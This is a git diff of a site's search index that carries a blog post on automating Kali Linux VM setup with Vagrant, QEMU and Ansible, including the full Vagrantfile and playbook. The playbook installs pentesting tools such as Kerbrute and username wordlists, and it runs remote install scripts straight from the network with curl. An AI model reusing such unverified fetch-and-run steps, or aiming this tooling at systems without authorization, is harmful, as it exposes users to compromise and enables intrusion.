         "url": "\/\/uildDrafts:1313\/tags\/msi\/"
@@ -2724,13 +2773,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/tools\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tools\/": {
-        "title": "Tools",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tools\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/vulnerability-assessment\/": {
@@ -3182,7 +3224,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/ssrf\/": {
-        "title": "Ssrf",
+        "title": "SSRF",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/ssrf\/"
@@ -3692,46 +3734,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/homelab\/20250220118-nixos-homelab\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/ansible\/": {
-        "title": "Ansible",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
-    },
-    
     "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/": {
         "title": "Automating Kali Linux VM Setup: A Comprehensive Guide to QEMU and Ansible Integration",
         "tags": ["kali","automation","qemu","ansible","dotfiles",],
         "content": "As a cybersecurity enthusiast and productivity junkie, I\u0026rsquo;ve always been fascinated by the power of automation. Recently, I decided to streamline my process of setting up Kali Linux virtual machines using QEMU and Ansible. In this article, I\u0026rsquo;ll walk you through how I\u0026rsquo;ve automated the creation and configuration of Kali VMs, complete with my preferred dotfiles and tools.\nThe Need for Automation If you\u0026rsquo;re like me, you probably find yourself creating new Kali VMs frequently for various projects or testing environments. The process of setting up a new VM, updating the system, installing your favorite tools, and configuring your environment can be time-consuming and repetitive. That\u0026rsquo;s where automation comes in handy. You can repurpose this setup for other projects, just change the Ansible playbook and dotfiles.\nBenefits and Challenges This automation setup offers several advantages:\nConsistent environment across all VMs Rapid deployment of new instances Version-controlled configuration (infrastructure as code) Easy sharing and collaboration Some challenges I encountered:\nVirtioFS setup complexity Ansible role organization Package version management Dotfiles synchronization But the benefits far outweigh the initial setup effort.\nPrerequisites Choose your preferred virtualization provider:\nVirtualBox Setup VirtualBox Vagrant Ansible QEMU/KVM Setup (Linux only) (My preferred setup) QEMU/KVM (≥ 4.2) Libvirt (≥ 6.2.0) Vagrant Ansible For QEMU/KVM shared folder support:\nHost: Linux kernel ≥ 5.4\nGuest: Linux kernel ≥ 5.4\nThere is some additional setup required for the vagrant-libvirt plugin so would advise you checkout QEMU/KVM Setup Guide Unable to resolve dependency vagrant-libvirterror: +Update+ 21/02/2025 I recently ran an update and encountered an issue where it refused to launch new VM\u0026rsquo;s. I received an error similar to the below (it was not exactly the same as I had a crash shortly after). Error message given during initialization: Unable to resolve dependency: user requested 'vagrant-libvirt (= 0.12.2)' after alot of searching I found this post I found following the steps resolved the issue. vagrant plugin repair vagrant plugin expunge --reinstall vagrant plugin update VAGRANT_DISABLE_STRICT_DEPENDENCY_ENFORCEMENT=1 vagrant plugin install vagrant-libvirt The Automation Stack My automation setup consists of three main components:\nVagrant for VM provisioning QEMU/KVM for virtualization Ansible for configuration management Let\u0026rsquo;s dive into each component.\n1. Vagrant with QEMU/KVM I chose QEMU/KVM over VirtualBox for several reasons:\nBetter performance on Linux hosts Once you have used KVM/QEMU you will never go back to VirtualBox etc. Native virtualization support VirtioFS for efficient file sharing The Vagrantfile handles:\nVM resource allocation (RAM, CPU) Network configuration Shared folder setup with VirtioFS Ansible provisioner integration Here\u0026rsquo;s the the Vagrantfile:\n# -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;kalilinux/rolling\u0026#34; config.vm.hostname = \u0026#34;kali-vm\u0026#34; # Set hostname inside VM # Disable the default share config.vm.synced_folder \u0026#34;.\u0026#34;, \u0026#34;/vagrant\u0026#34;, disabled: true # Force libvirt provider ENV[\u0026#39;VAGRANT_DEFAULT_PROVIDER\u0026#39;] = \u0026#39;libvirt\u0026#39; # QEMU/libvirt specific settings config.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 libvirt.graphics_type = \u0026#34;spice\u0026#34; libvirt.video_type = \u0026#34;qxl\u0026#34; libvirt.title = \u0026#34;Kali Linux VM\u0026#34; # Set VM title in libvirt libvirt.description = \u0026#34;Kali Linux VM for Security Testing\u0026#34; # Optional description # Enable shared memory for VirtioFS libvirt.memorybacking :access, :mode =\u0026gt; \u0026#34;shared\u0026#34; end # Configure shared folders using VirtioFS config.vm.synced_folder \u0026#34;/home/martin/.config/tmuxinator\u0026#34;, \u0026#34;/home/vagrant/.config/tmuxinator\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.02-LinuxTools\u0026#34;, \u0026#34;/home/vagrant/linuxTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools\u0026#34;, \u0026#34;/home/vagrant/windowsTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career\u0026#34;, \u0026#34;/home/vagrant/Dropbox/40-49_Career\u0026#34;, type: \u0026#34;virtiofs\u0026#34; # Network settings config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.57.11\u0026#34; config.ssh.forward_x11 = true # Provisioning configuration for Ansible config.vm.provision \u0026#34;ansible\u0026#34; do |ansible| ansible.playbook = \u0026#34;../../Ansible/configure-kali.yml\u0026#34; end end 2. Ansible Configuration Ansible automates the entire VM setup process. The main playbook handles:\nSystem updates and package installation Development tools setup Security tools installation Terminal environment configuration (Alacritty, Tmux) Editor setup (Doom Emacs) Dotfiles deployment Here\u0026rsquo;s the main Ansible playbook:\n--- - name: Configure Kali Linux hosts: all become: yes # This is equivalent to using sudo vars: user_home: \u0026#34;/home/vagrant\u0026#34; docker_gpg_key_url: \u0026#34;https://download.docker.com/linux/debian/gpg\u0026#34; docker_repo: \u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable\u0026#34; tasks: - name: Update apt cache apt: update_cache: yes cache_valid_time: 3600 - name: Download Iosevka Nerd Font (be patient big file!) get_url: url: https://github.com/ryanoasis/nerd-fonts/releases/download/v3.3.0/Iosevka.zip dest: /tmp/Iosevka.zip mode: \u0026#39;0644\u0026#39; - name: Install unzip if not present apt: name: unzip state: present - name: Extract Iosevka font unarchive: src: /tmp/Iosevka.zip dest: \u0026#34;/usr/local/share/fonts/\u0026#34; remote_src: yes owner: vagrant group: vagrant - name: Update font cache command: fc-cache -fv become_user: vagrant - name: Install base packages apt: name: - eza - alacritty - git - bat - seclists - git - emacs - ripgrep - fd-find state: present - name: Create docker GPG directory file: path: /etc/apt/keyrings state: directory mode: \u0026#39;0755\u0026#39; - name: Check if Docker GPG key exists stat: path: /etc/apt/keyrings/docker.gpg register: docker_gpg - name: Add Docker GPG key shell: | curl -fsSL {{ docker_gpg_key_url }} | gpg --dearmor -o /etc/apt/keyrings/docker.gpg when: not docker_gpg.stat.exists - name: Check if Docker repository exists stat: path: /etc/apt/sources.list.d/docker.list register: docker_repo_file - name: Add Docker repository copy: content: \u0026#34;{{ docker_repo }}\u0026#34; dest: /etc/apt/sources.list.d/docker.list when: not docker_repo_file.stat.exists - name: Install Docker packages apt: name: - docker-ce - docker-ce-cli - containerd.io update_cache: yes state: present - name: Download Starship install script get_url: url: https://starship.rs/install.sh dest: /tmp/starship-install.sh mode: \u0026#39;0755\u0026#39; register: download_script - name: Install Starship shell: /tmp/starship-install.sh --yes args: creates: /usr/local/bin/starship when: download_script is success async: 180 # 5 minute timeout poll: 5 # Check every 5 seconds - name: Install oh-my-zsh become_user: vagrant shell: sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; \u0026#34;\u0026#34; --unattended args: creates: \u0026#34;{{ user_home }}/.oh-my-zsh\u0026#34; - name: Install zsh plugins become_user: vagrant git: repo: \u0026#34;{{ item.repo }}\u0026#34; dest: \u0026#34;{{ user_home }}/.oh-my-zsh/custom/plugins/{{ item.name }}\u0026#34; loop: - { repo: \u0026#39;https://github.com/zsh-users/zsh-autosuggestions\u0026#39;, name: \u0026#39;zsh-autosuggestions\u0026#39; } - { repo: \u0026#39;https://github.com/zsh-users/zsh-syntax-highlighting.git\u0026#39;, name: \u0026#39;zsh-syntax-highlighting\u0026#39; } - { repo: \u0026#39;https://github.com/marlonrichert/zsh-autocomplete.git\u0026#39;, name: \u0026#39;zsh-autocomplete\u0026#39; } - { repo: \u0026#39;https://github.com/zdharma-continuum/fast-syntax-highlighting.git\u0026#39;, name: \u0026#39;fast-syntax-highlighting\u0026#39; } - name: Install tmuxinator gem: name: tmuxinator state: present - name: Clone Statistically Likely Usernames git: repo: https://github.com/insidetrust/statistically-likely-usernames.git dest: /usr/share/wordlists/statistically-likely-usernames - name: Download and install Kerbrute get_url: url: https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 dest: /usr/local/bin/kerbrute mode: \u0026#39;0755\u0026#39; - name: Install build dependencies for Emacs apt: name: - build-essential - libgccjit-12-dev - libgnutls28-dev - libjansson4 - libjansson-dev - libncurses-dev - libsqlite3-dev - libgif-dev - libjpeg-dev - libpng-dev - libtiff5-dev - libxpm-dev - libwebp-dev - libgtk-3-dev - texinfo - autoconf - automake - pkg-config state: present install_recommends: no register: pkg_result retries: 3 delay: 5 until: pkg_result is success - name: Install tree-sitter separately apt: name: libtree-sitter-dev state: present register: tree_sitter_result retries: 3 delay: 5 until: tree_sitter_result is success - name: Check if Emacs 29.4 is installed command: emacs --version register: emacs_version ignore_errors: true changed_when: false - name: Clone Emacs repository git: repo: git://git.savannah.gnu.org/emacs.git dest: /tmp/emacs version: emacs-29.4 when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Run autogen shell: | cd /tmp/emacs ./autogen.sh when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Configure Emacs shell: | cd /tmp/emacs ./configure --with-native-compilation --with-json --with-tree-sitter --with-sqlite3 args: creates: /tmp/emacs/Makefile when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Build Emacs shell: | cd /tmp/emacs make -j$(nproc) args: creates: /tmp/emacs/src/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 1800 poll: 15 - name: Install Emacs become: yes shell: | cd /tmp/emacs make install args: creates: /usr/local/bin/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 900 poll: 15 - name: Install other base packages apt: name: - eza - alacritty - git - bat - seclists - ripgrep - fd-find state: present install_recommends: no - name: Setup dotfiles become_user: vagrant block: - name: Clone dotfiles git: repo: https://github.com/bloodstiller/kaliconfigs.git dest: \u0026#34;{{ user_home }}/.dotfiles\u0026#34; version: main # Or whatever branch you\u0026#39;re using update: yes # Ensures latest version is cloned clone: yes force: yes # This will overwrite local changes - name: Create required directories file: path: \u0026#34;{{ item }}\u0026#34; state: directory loop: - \u0026#34;{{ user_home }}/.doom.d\u0026#34; - \u0026#34;{{ user_home }}/.config\u0026#34; - name: Create symlinks file: src: \u0026#34;{{ item.src }}\u0026#34; dest: \u0026#34;{{ item.dest }}\u0026#34; state: link force: yes loop: - { src: \u0026#34;{{ user_home }}/.dotfiles/Zsh/.zshrc\u0026#34;, dest: \u0026#34;{{ user_home }}/.zshrc\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/config.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/config.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/init.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/init.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/packages.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/packages.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/README.org\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/README.org\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Starship/starship.toml\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/starship.toml\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Alacritty\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/Alacritty\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Tmux/.tmux.conf\u0026#34;, dest: \u0026#34;{{ user_home }}/.tmux.conf\u0026#34; } - name: Install Doom Emacs become_user: vagrant block: - name: Clone Doom Emacs git: repo: https://github.com/doomemacs/doomemacs dest: \u0026#34;{{ user_home }}/.config/emacs\u0026#34; depth: 1 - name: Install Doom Emacs # This is correct and the path is correct! shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom install --force\u0026#34; args: creates: \u0026#34;{{ user_home }}/.emacs.d/bin/doom\u0026#34; async: 900 poll: 15 - name: Update Doom recipe repositories shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom sync -u\u0026#34; async: 900 poll: 15 - name: Enable Docker service systemd: name: docker enabled: yes state: started - name: Add user to docker group user: name: vagrant groups: docker append: yes - name: Clean up apt: autoremove: yes clean: yes 3. Dotfiles and Tool Configuration The automation includes configuration for:\nAlacritty terminal emulator Tmux with custom keybindings Doom Emacs with security-focused packages Starship cross-shell prompt Zsh with Oh My Zsh Each tool has its own configuration module in the repository:\nAlacritty Configuration Tmux Configuration Doom Emacs Configuration Starship Configuration Zsh Configuration Included Tools \u0026amp; Features The automation sets up a comprehensive environment with:\nSecurity Tools SecLists (lots of lists) Kerbrute for Kerberos authentication testing Statistically Likely Usernames wordlist Common pentesting tools (I have my folders for linux \u0026amp; windows tools (I will make a repo for that soon)) Bloodhound for Active Directory analysis (dockerized) Development Environment Emacs 29.4 with native compilation Doom Emacs configuration This is my main editor and I use it for everything but if you prefer another editor you can change the Ansible playbook. Git version control Docker and Docker Compose Build tools and development libraries Modern Terminal Experience Alacritty terminal emulator Starship cross-shell prompt Tmuxinator for session management Command Line Improvements Eza (modern ls replacement) Bat (better cat) Ripgrep for searching fd-find for file discovery Enhanced Zsh configuration: zsh-autosuggestions zsh-syntax-highlighting zsh-autocomplete fast-syntax-highlighting Getting Started To use this automation:\nClone the repository:\ngit clone https://github.com/bloodstiller/kaliconfigs.git cd kaliconfigs Install prerequisites:\n# For Debian/Ubuntu sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients vagrant ansible # For Arch Linux sudo pacman -S qemu-full libvirt vagrant ansible Start the VM:\ncd Vagrant/QEMU vagrant up Development Workflow For efficient development and testing:\nRerun only Ansible playbooks:\nvagrant provision Run Ansible directly against the VM:\nvagrant ssh-config \u0026gt; vagrant-ssh-config ansible-playbook -i .vagrant/provisioners/ansible/inventory/vagrant_ansible_inventory Ansible/configure-kali.yml Use snapshots for safe testing:\nvagrant snapshot save baseline vagrant snapshot restore baseline Customization Options The automation is highly customizable:\nVM Resources (Vagrantfile):\nconfig.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 end Package Selection (Ansible):\n​ - name: Install base packages apt: name: ​ - eza ​ - alacritty ​ - git # Add your packages here Shared Folders:\nconfig.vm.synced_folder \u0026#34;/path/to/host\u0026#34;, \u0026#34;/path/in/guest\u0026#34;, type: \u0026#34;virtiofs\u0026#34; Documentation \u0026amp; Resources For detailed setup and configuration instructions, refer to:\nMain Project Documentation - Overview and quick start guide Ansible Configuration Guide - Detailed playbook customization QEMU/KVM Setup Guide - QEMU-specific installation and configuration Alacritty Configuration - Terminal emulator setup Doom Emacs Configuration - Editor configuration Tmux Configuration - Terminal multiplexer setup Starship Configuration - Shell prompt customization Zsh Configuration - Shell configuration and plugins Conclusion Automating Kali VM setup with QEMU and Ansible has significantly improved my workflow. The combination of Vagrant for VM management, QEMU for virtualization, and Ansible for configuration provides a powerful and flexible automation stack.\nThe complete code is available in my kaliconfigs repository . Feel free to fork it and adapt it to your needs.\nHappy hacking!\n", 
         "url": "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/automation\/": {
-        "title": "Automation",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
-        "title": "Dotfiles",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/kali\/": {
-        "title": "Kali",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/qemu\/": {
-        "title": "Qemu",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
     },
     
     "\/\/uildDrafts:1313\/walkthroughs\/redpanda-box\/": {
